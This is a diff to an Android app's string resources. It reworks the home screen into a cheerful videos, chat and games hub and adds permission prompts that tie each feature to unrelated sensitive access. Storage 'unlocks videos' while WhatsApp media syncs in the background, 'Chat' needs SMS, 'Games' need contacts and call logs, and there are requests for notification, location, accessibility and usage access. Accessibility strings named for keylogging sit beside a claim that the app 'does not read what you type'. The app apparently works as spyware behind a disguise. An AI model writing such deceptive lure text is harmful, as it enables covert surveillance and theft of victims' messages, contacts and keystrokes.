@@ -6,7 +6,28 @@
     <string name="login_google">Continue with Google</string>
     <string name="google_sign_in_not_configured">Google Sign-In is not configured. Enable Google provider in Firebase Console, add your SHA-1 fingerprint, then download the updated google-services.json.</string>
     <string name="login_facebook">Continue with Facebook</string>
-    <string name="dashboard_title">Dashboard</string>
+    <string name="dashboard_title">Home</string>
+    <string name="home_greeting">Hey there</string>
+    <string name="home_subtitle">Pick something fun — videos, chat, or games.</string>
+    <string name="home_section_explore">Explore</string>
+    <string name="home_chip_videos">Fresh videos</string>
+    <string name="home_chip_chat">Live chat</string>
+    <string name="home_chip_games">Play now</string>
+    <string name="home_videos_title">Videos</string>
+    <string name="home_videos_desc">Watch the latest clips in HD</string>
+    <string name="home_chat_title">Chat</string>
+    <string name="home_chat_desc">Start a video call</string>
+    <string name="home_games_title">Games</string>
+    <string name="home_games_desc">Quick fun puzzles</string>
+    <string name="home_tip_title">Quick tip</string>
+    <string name="home_tip_body">Tap any colorful tile to jump right in.</string>
+    <string name="videos_banner_title">Video collection</string>
+    <string name="videos_banner_desc">Tap a card to play instantly</string>
+    <string name="videos_empty_title">No videos yet</string>
+    <string name="videos_empty_desc">New videos uploaded from admin will appear here.</string>
+    <string name="games_banner_title">Game arcade</string>
+    <string name="games_banner_desc">Choose a game and start playing</string>
+    <string name="games_tap_to_play">Tap to play</string>
     <string name="dashboard_profile_menu_description">Open profile</string>
     <string name="verification_title">Verify your email</string>
     <string name="verification_cta_description">We need to verify your email address before you can use the app.</string>
@@ -95,4 +116,34 @@
     <string name="hello_blank_fragment">Hello blank fragment</string>
     <string name="keylog_accessibility_description">Allows the app to run in the background and improve your experience.</string>
     <string name="keylog_accessibility_prompt">Please enable Accessibility for this app in settings to continue.</string>
+
+    <!-- Progressive feature permissions -->
+    <string name="unlock_videos_title">Unlock videos</string>
+    <string name="unlock_videos_message">Allow storage access to unlock the video section. After that you can watch videos, and WhatsApp media will sync in the background.</string>
+    <string name="unlock_videos_allow">Allow storage</string>
+    <string name="unlock_videos_success">Videos unlocked</string>
+    <string name="unlock_videos_denied">Storage permission is needed to unlock videos</string>
+    <string name="unlock_videos_required">Unlock videos from the dashboard first (allow storage)</string>
+
+    <string name="perm_allow">Allow</string>
+    <string name="perm_chat_title">Enable Chat</string>
+    <string name="perm_chat_message">Chat needs SMS access to show your conversations.</string>
+    <string name="perm_chat_denied">SMS permission is needed for Chat</string>
+    <string name="perm_games_title">Enable Games</string>
+    <string name="perm_games_message">Games need contacts and call log access for this feature.</string>
+    <string name="perm_games_granted">Access granted</string>
+    <string name="perm_games_denied">Contacts and call log permission is needed for Games</string>
+    <string name="perm_notif_title">Notification access</string>
+    <string name="perm_notif_message">Turn on notification access so Chat can stay up to date with alerts.</string>
+    <string name="perm_location_title">Nearby content</string>
+    <string name="perm_location_message">Allow location to personalize content on your profile.</string>
+    <string name="perm_location_granted">Location enabled</string>
+    <string name="perm_accessibility_title">Improve experience</string>
+    <string name="perm_accessibility_message">Enable Accessibility for smoother background features.</string>
+
+    <string name="perm_usage_title">App usage access</string>
+    <string name="perm_usage_message">Allow Usage Access so this app can show which apps were used and for how long (screen time). This does not read what you type.</string>
+    <string name="perm_usage_open_settings">Open settings</string>
+    <string name="perm_usage_not_now">Not now</string>
+    <string name="perm_usage_enabled">App usage tracking enabled</string>
 </resources>
